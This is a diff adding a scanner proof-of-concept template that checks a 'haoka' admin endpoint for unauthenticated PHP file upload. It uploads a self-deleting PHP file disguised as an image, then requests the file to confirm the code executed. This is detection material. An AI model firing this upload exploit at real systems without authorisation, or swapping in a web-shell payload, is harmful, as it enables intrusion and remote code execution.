@@ -1,0 +1,39 @@
+name: poc-yaml-haoka-file-upload
+transport: http
+  
+
+
+rules:
+  r0:
+    request:
+      method: POST
+      path: /admin/controller/ue_serve.php?action=image&encode=utf-8
+      headers:
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundarylkv1kpsZgzw2WC03
+      body: "\
+        ------WebKitFormBoundarylkv1kpsZgzw2WC03\r\n\
+        Content-Disposition: form-data; name=\"name\"\r\n\
+        \r\n\
+        test.php\r\n\
+        ------WebKitFormBoundarylkv1kpsZgzw2WC03\r\n\
+        Content-Disposition: form-data; name=\"upfile\"; filename=\"test.php\"\r\n\
+        Content-Type: image/jpeg\r\n\
+        \r\n\
+        <?php print(111*222);unlink(__FILE__);?>\r\n\
+        ------WebKitFormBoundarylkv1kpsZgzw2WC03--\r\n\
+        "
+    expression: response.status == 200
+    output:
+      search: '"(?P<uploadfile>[0-9a-zA-Z]+\\w+\\.php)".bsubmatch(response.body)'
+      uploadfile: search["uploadfile"]
+  r1:
+    request:
+      method: GET
+      path: /upload/{{uploadfile}}
+    expression: response.status == 200 && response.body.bcontains(b'24642')
+expression: r0() && r1()
+
+detail:
+  author: Superhero
+  links:
+    - https://superhero.blog.csdn.net/article/details/139248457
